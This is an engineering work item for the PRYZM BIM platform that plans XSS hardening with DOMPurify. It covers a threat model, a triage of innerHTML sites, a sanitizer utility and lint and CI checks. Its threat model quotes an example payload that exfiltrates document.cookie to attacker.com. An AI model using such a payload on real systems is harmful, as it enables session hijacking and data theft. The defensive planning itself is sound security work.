# OPEN-005 — Phase F.security: DOMPurify / XSS Hardening

> **Status**: 🔴 ACTIVE — P0 priority, must fix before enterprise pilots
> **Anchor**: C08 §3 (Collaboration & Security), C14 LP-06
> **Effort**: 1–2 day sprint (P0 — immediate)
> **Outcome**: All `innerHTML` writes in user-facing panels sanitized with DOMPurify. No unsanitized external content rendered via innerHTML.

---

## §0 — Threat Model

PRYZM is a BIM platform that imports IFC files from external sources. IFC files are ZIP archives containing XML/STEP data with arbitrary string content in:
- `IFCPROPERTYSINGLEVALUE` fields (property set names and values)
- `IFCPROJECTEDCRS` metadata strings
- `IFCPOSTALADDRESS` fields
- Custom Pset names from third-party plugins

Any of these strings can be rendered as HTML in:
- Property inspector panels (`PropertyInspectorApply.ts`)
- Element details panels
- IFC property viewers in the schedule view
- BIM metadata sidebars

**Attack scenario**: A malicious actor sends a crafted IFC file to a PRYZM user. The IFC contains `<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">` as a property value. When the user opens the model and views the property, the script executes in the PRYZM app context.

**Impact**: Session cookie theft, arbitrary API calls as the authenticated user, potential access to the user's projects and collaboration data.

**Current state**: 609 `innerHTML` writes exist across the codebase. Only 3 use `DOMPurify`. The other 606 are unprotected.

---

## §1 — Current State (2026-05-16 verified)

```bash
# Unsanitized innerHTML writes:
rg "innerHTML\s*=" src/ apps/ packages/ plugins/ --type ts | grep -v "DOMPurify|sanitize|__tests__|\.spec\." | wc -l
# → 609

# DOMPurify usages:
rg "DOMPurify|dompurify" src/ apps/ --type ts | wc -l
# → 3
```

**DOMPurify is already in `package.json`** — this is a usage gap, not an installation gap.

---

## §2 — Triage: High-Risk vs. Low-Risk Sites

Not all 609 sites are equal. The high-risk sites render strings that can originate from external IFC files. The low-risk sites render compile-time constants.

### Tier 1 — CRITICAL (must sanitize immediately)

Sites that render runtime strings from IFC/user-supplied sources:

| File | Approximate count | Risk | Reason |
|---|---:|---|---|
| `apps/editor/src/ui/property-inspector/PropertyInspectorApply.ts` | ~20 | CRITICAL | Renders Pset property values from IFC |
| `apps/editor/src/ui/panels/BimPropertiesPanel.ts` | ~15 | CRITICAL | Renders all IFC property strings |
| `apps/editor/src/ui/panels/SchedulePanel.ts` | ~12 | CRITICAL | Renders element properties in schedule grid |
| `plugins/ifc-inspector/src/` | ~10 | CRITICAL | IFC property viewer — all strings from file |
| `apps/editor/src/ui/panels/ElementDetailsPanel.ts` | ~8 | CRITICAL | Element name/description from IFC |

**Total Tier 1: ~65 sites**

### Tier 2 — HIGH (sanitize in same sprint)

Sites that render user-entered data (project names, element labels):

| File | Approximate count | Risk |
|---|---:|---|
| `apps/editor/src/ui/panels/ProjectPanel.ts` | ~5 | HIGH — project name from DB |
| `apps/editor/src/ui/annotation/AnnotationRenderer.ts` | ~8 | HIGH — annotation text from user |
| `apps/marketplace/src/App.tsx` | ~4 | HIGH — plugin descriptions from marketplace |

**Total Tier 2: ~17 sites**

### Tier 3 — LOW (deferred cleanup, not a security risk)

Sites that render compile-time string constants (UI labels, icon names, static template strings):

- `apps/editor/src/ui/layout/` panel chrome labels — string literals only
- `apps/editor/src/ui/toolbar/` button labels — static strings
- `packages/ui-base/src/` base components rendering controlled props

**Total Tier 3: ~527 sites** — these use `innerHTML` for performance reasons (setting template HTML) and pose no XSS risk if the input is a string literal or controlled React prop.

---

## §3 — Sprint Plan (1–2 days)

### Day 1: DOMPurify wrapper + Tier 1 sites

**Step 1: Create a sanitization utility (30 min)**

```typescript
// packages/ui-base/src/sanitize.ts
import DOMPurify from 'dompurify';

const PRYZM_PURIFY_CONFIG: DOMPurify.Config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span', 'br'],
  ALLOWED_ATTR: [],
  FORBID_SCRIPTS: true,
  FORBID_TAGS: ['script', 'object', 'embed', 'link', 'style', 'iframe'],
};

/**
 * Sanitize a string before rendering as innerHTML.
 * Use exclusively for strings that originate from external sources
 * (IFC files, user input, marketplace content).
 *
 * For compile-time constants, use textContent or JSX — not innerHTML.
 */
export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, PRYZM_PURIFY_CONFIG);
}

/**
 * Sanitize a string that should contain no HTML at all (property values, IDs).
 * Strips all tags.
 */
export function sanitizeText(dirty: string): string {
  return DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
}
```

**Step 2: Apply to Tier 1 sites (4–6 hours)**

Pattern for each site:

```typescript
// BEFORE
element.innerHTML = propertyValue;

// AFTER
import { sanitizeHtml } from '@pryzm/ui-base/sanitize';
element.innerHTML = sanitizeHtml(propertyValue);
```

For IFC property values specifically — these should never contain HTML:

```typescript
// BEFORE
propertyCell.innerHTML = pset.value;

// AFTER — IFC values are plain text, strip all HTML
import { sanitizeText } from '@pryzm/ui-base/sanitize';
propertyCell.innerHTML = sanitizeText(pset.value);
```

### Day 2: Tier 2 sites + ESLint rule

**Step 1: Apply to Tier 2 sites (2–3 hours)**

Same pattern as Day 1 for annotation text and marketplace descriptions.

**Step 2: Add ESLint rule to `packages/eslint-plugin-pryzm/` (2 hours)**

```typescript
// packages/eslint-plugin-pryzm/src/rules/no-unsafe-innerhtml.ts
// Rule: Disallow innerHTML assignments that don't call sanitizeHtml() or sanitizeText()
// This prevents new unsanitized innerHTML writes from being introduced.
```

Add to `.eslintrc` as `@pryzm/no-unsafe-innerhtml: error` — this turns XSS prevention into a lint error on every PR.

**Step 3: Add to GA gate (1 hour)**

Create `tools/ga-gate/check-unsafe-innerhtml.ts` that counts unsanitized innerHTML writes in Tier 1/2 files and fails if the count rises above the baseline set today.

---

## §4 — Tier 3 Deferred Cleanup (post-Phase E.5.x)

The 527 Tier 3 sites rendering compile-time constants via `innerHTML` should be converted to:
- `element.textContent = label` for plain text
- React JSX `<div>{label}</div>` for template content

This is a code quality improvement, not a security fix. Schedule as part of Phase H (code cleanup), not as part of this sprint.

---

## §5 — Acceptance Criteria

```bash
# Tier 1 sites sanitized
rg "innerHTML\s*=" apps/editor/src/ui/property-inspector --type ts | grep -v "sanitizeHtml\|sanitizeText\|__tests__" | wc -l
# Expected: 0

# Tier 1 sites sanitized (IFC inspector plugin)
rg "innerHTML\s*=" plugins/ifc-inspector/src --type ts | grep -v "sanitize\|__tests__" | wc -l
# Expected: 0

# Sanitization utility exists
ls packages/ui-base/src/sanitize.ts
# Expected: file exists

# DOMPurify usage count increased
rg "DOMPurify|sanitizeHtml|sanitizeText" src/ apps/ packages/ plugins/ --type ts | wc -l
# Expected: ≥ 80 (up from 3)

# ESLint rule exists
ls packages/eslint-plugin-pryzm/src/rules/no-unsafe-innerhtml.ts
# Expected: file exists
```

---

## §6 — Related Items

- C08 §3.1 — "All external string content rendered via innerHTML MUST be sanitized with DOMPurify"
- OI-020 (from `07-OPEN-ITEMS.md`) — XSS hardening
- `PRYZM3-MASTER-STATUS-2026-05-16.md §7 GAP-009`

---

*Stamp: 2026-05-16. P0 priority — start before any E.5.x sprint. Blocked by: nothing. Estimated: 1.5 days.*
